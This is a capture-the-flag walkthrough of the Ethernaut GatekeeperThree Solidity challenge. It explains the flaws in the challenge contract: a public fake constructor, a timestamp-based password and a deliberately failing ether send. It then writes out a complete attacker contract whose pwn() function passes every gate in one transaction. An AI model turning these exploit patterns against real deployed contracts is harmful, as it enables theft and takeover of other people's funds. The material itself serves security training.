# Ethernaut Walkthrough: Gatekeeper Three
## Welcome to KweenBirb's 29th installment of Ethernaut walkthroughs! 

Ethernaut is a set of gamified Solidity challenges in the style of a CTF, where each level features a hackable smart contract that will inform you of various known security vulnerabilities on EVM blockchains.

This repo will walk you through a solution to GatekeeperThree.sol, the 29th challenge in the series. You can find the challenge itself and fully fleshed out solution in the .txt file in the root directory and .sol file in the ./src directory. Let's begin!

In this challenge, Ethernaut instructs us, blithely: 'Cope with gates and become an entrant.' I guess once we've reached the third iteration of Gatekeeper challenges, we no longer really need a lot of instructions to get going. Love it! ;P

## Let's get started, shall we?

This time around, we have two contracts to be responsible for: the GatekeeperThree contract where the usual three modifiers provide logic obstacles for us to overcome as well as the SimpleTrick contract where a password of sorts is stored, presumably to add to the complexity of one or more gates.

As in previous Gatekeeper challenges, there is an enter function whose only logic is to set the storage address entrant to tx.origin. Seeing as they could have made the entrant msg.sender, it's likely this exploit will involve a malicious contract of our making.

## GateOne

The gateOne() modifier causes a revert in the case that msg.sender _does not_ match the storage address variable called owner as well as in the case that tx.origin _does_ match the storage address owner. This means that we first have to somehow assume ownership of the contract to move forward, so let's start there.

The only function in which the owner variable is referenced is here:

```
function construct0r() public {
      owner = msg.sender;
}
```

Would you look at that, a plain old public function made to look (almost) like a constructor! Assuming ownership in this case should be very easy, but recall that tx.origin must not be the owner, only msg.sender may. Using a malicious smart contract as a proxy to interacting with GatekeeperThree is therefore necessary to pass the first gate.

If we call ```construct0r()``` through an external contract call, our contract becomes owner but tx.origin (ie us) does not. Since we've confirmed we'll need one, let's start prepping our smart contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './GatekeeperThree.sol';

contract TrixR4Kids {

    GatekeeperThree gatekeeperThree;

    constructor(address payable $your_ethernaut_instance_here) payable {
        gatekeeperThree = GatekeeperThree($your_ethernaut_instance_here);
    }

    function pwn() public {
        gatekeeperThree.construct0r(); // gate one
    }
}
```

Why is the constructor payable, you ask? So observant of you! We'll get there.

## GateTwo

Moving on to the next modifier, gateTwo(), we see that the second obstacle to overcome is the storage boolean called allow_entrance must be set to true. This variable is initialized to false in storage, which happens on contract deployment.

```bool public allow_enterance = false;```

Side note- booleans are always initialized to false in Solidity anyway, in this case the assignment included here is unnecessary. Fret not, I've already made a PR.

That begs the question, how do we set allow_entrance to true? Looks like there's a function just for that purpose:

```
function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
}
```

Ah, yes that password stuff we noticed in the SimpleTrick contract. Looks like we'll need to dive a bit deeper there to provide the right uint _password before we can set allow_entrance to true.

The password variable is stored in SimpleTrick's storage, initialized at contract deployment to the confirming block's timestamp:

```uint private password = block.timestamp;```

But there's a little catch! The checkPassword() function invoked in GatekeeperThree's getAllowance() function (which we need to successfully execute to set allow_entrance to true) will actually reset the password if we get the password wrong.

```
function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
}
```

A password that shifts everytime it's guessed wrong! Can you imagine how chaotic that would be if passwords worked that way by default?

Anyway, there are a few options for ensuring we choose the correct password, like pulling the (private) storage slot using an off-chain script or using a Foundry command. The way we've started structuring our malicious contract's pwn() function however makes me optimistic that we can execute the entire hack in a single transaction, which would allow us to simply feed ```block.timestamp``` into the function.

But first, there's a problem here. Do you know what it is? That's right, there is no instance of the SimpleTrick contract to even call! Let's remedy that post haste, shall we?

Adding to our pwn() function, we can use GatekeeperThree's aptly named createTrick() function to deploy and initialize a SimpleTrick instance. Once we've done so, a call to GatekeeperThree's getAllowance() function, providing ```block.timestamp``` as the uint parameter, will successfully set allow_entrance to true. This is because SimpleTrick is deployed in the same transaction as the getAllowance() call, so the private password will be pulling the same global block.timestamp that we have access to in the same transaction.

```
function pwn() public {
    gatekeeperThree.construct0r(); // gate one

    gatekeeperThree.createTrick(); // required to pass gate two
    gatekeeperThree.getAllowance(block.timestamp); // gate two
}
```

## GateThree

Finally, let's examine GateThree to see what we're up against before completing the hack.

```
modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
}
```

That's interesting- note that the if clause requires the Gatekeeper contract to hold an ether balance while simultaneously being unable to send some of that ether balance to the owner address in storage.

Two things stand out, the first being that since we're using a malicious smart contract to assume ownership we can just choose not to implement a payable fallback or receive function. The second takeaway is that we'll need a way to ensure GatekeeperThree possesses an ether balance enough to satisfy the if clause. Our hack won't execute without it!

That's where the payable keyword in our constructor from earlier comes in. We'll need to provide ether to fund the Gatekeeper's failing attempts at paying its owner in GateThree.

Once our contract is funded in the constructor, some arithmetic accomplishes the rest for us:

```
    // in case victim doesn't have enough funds to be hacked
    uint256 bal = address(gatekeeperThree).balance;
    if (bal < 0.001 ether + 1 wei) {
        uint256 diff = 0.001 ether + 1 wei - bal;
        (bool q,) = address(gatekeeperThree).call{ value: diff }('');
    }
```

This way, we can rest assured that GatekeeperThree will always be refreshed to 0.001E + 1 wei before continuing execution, satisfying the third gate.

## Pew pew

With everything in place to exploit GatekeeperThree, all that's left is to provide the line that'll register us as an entrant:

```gatekeeperThree.enter();```

But wait a second, if we're gonna be funding this malicious contract with Goerli $ETH to its constructor, we should put in a way for any extra funds to be returned! Now that Goerli ether has a bridge with actual liquidity, it's got a real price tag! gEth is.. money!? Yeah, let's definitely not waste any:

```
    // GOERLI ETH IS VALUABLE NOW, OKAY?? IT'S REAL MONEY APPARENTLY !
    (bool r,) = msg.sender.call{ value: address(this).balance }('');
```

There we go, waste not want not! All in all, this is what the hack looks like:

```
function pwn() public {
    gatekeeperThree.construct0r(); // gate one

    gatekeeperThree.createTrick(); // required to pass gate two
    gatekeeperThree.getAllowance(block.timestamp); // gate two

    // in case victim doesn't have enough funds to be hacked
    uint256 bal = address(gatekeeperThree).balance;
    if (bal < 0.001 ether + 1 wei) {
        uint256 diff = 0.001 ether + 1 wei - bal;
        (bool q,) = address(gatekeeperThree).call{ value: diff }('');
    }

    gatekeeperThree.enter();

    // GOERLI ETH IS VALUABLE NOW, OKAY?? IT'S REAL MONEY APPARENTLY !
    (bool r,) = msg.sender.call{ value: address(this).balance }('');
}
```

Go ahead and deploy attacker contract _being sure to provide funds_ to the _payable_ constructor! Remember, the hack doesn't work without this ETH! Once you've deployed, hit that sweet pwn() button and crack open a cold one. You've earned it :)

Congratulations on completing the (at time of writing) final level of Ethernaut, anon!

○•○ h00t h00t ○•○
